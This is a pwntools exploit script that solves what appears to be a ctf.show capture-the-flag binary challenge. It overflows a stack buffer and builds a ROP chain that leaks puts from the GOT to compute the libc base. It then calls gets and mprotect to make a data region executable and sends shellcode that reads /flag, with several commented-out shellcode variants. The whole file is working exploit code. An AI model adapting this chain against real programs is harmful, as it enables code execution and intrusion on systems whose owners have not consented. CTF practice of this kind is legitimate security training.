from pwn import *
from LibcSearcher import *

# context(log_level='debug',arch='i386', os='linux')
context(log_level='debug',arch='amd64', os='linux')


pwnfile = "./pwn"
io = remote("pwn.challenge.ctf.show",28190)
# io = process(pwnfile)
elf = ELF(pwnfile)
libc = ELF("./lib/x86_64-linux-gnu/libc-2.27.so")


s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims		    :io.recvuntil(delims)
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))


ret = 0x0000000000400640
pop_rdi_ret = 0x0000000000401ba3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_ret = elf.sym['main']
data = 0x603000

ru(b">> ")

payload = b"A"*0x418+p8(0x28)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_ret)
sl(payload)



puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
libc_base = puts_addr-libc.sym["puts"]
mprotect_addr = libc_base+libc.sym["mprotect"]
pop_rdx = libc_base+0x0000000000001b96
pop_rsi = libc_base+0x23e6a
gets_addr = libc_base+libc.sym["gets"]
print("libc_base---------------------->: ",hex(libc_base))

ru(b">> ")
payload = b"A"*0x418+p8(0x28)+p64(pop_rdi_ret)+ p64(data)
payload += p64(gets_addr)+p64(pop_rdi_ret)+p64(data)
payload += p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)
payload += p64(7)+p64(mprotect_addr)+ p64(data)
#这里的data或者bss要以0x000结尾才行

# gdb.attach(io)
sl(payload)

#方法一

# sh = '''
# mov rax, 0x67616c662f2e
# push rax
# mov rdi, rsp
# xor esi, esi
# mov eax, 2
# syscall

# cmp eax, 0
# jg next
# push 1
# mov edi, 1
# mov rsi, rsp
# mov edx, 4
# mov eax, edi
# syscall
# jmp exit

# next:
# mov edi, eax
# mov rsi, rsp
# mov edx, 0x100
# xor eax, eax
# syscall

# mov edx, eax
# mov edi, 1
# mov rsi, rsp
# mov eax, edi
# syscall

# exit:
# xor edi, edi
# mov eax, 231
# syscall
# '''

# 方法二

# sh = ''
# sh += shellcraft.open('/flag')
# sh += shellcraft.read(3,'rsp',0x100)
# sh += shellcraft.write(1,'rsp',0x100)
# shell = asm(sh)


#方法三

# sh = shellcraft.cat("/flag")
# shell = asm(sh)

#方法四

sh = shellcraft.readfile("/flag",2)
shell = asm(sh)

sl(shell)

itr()
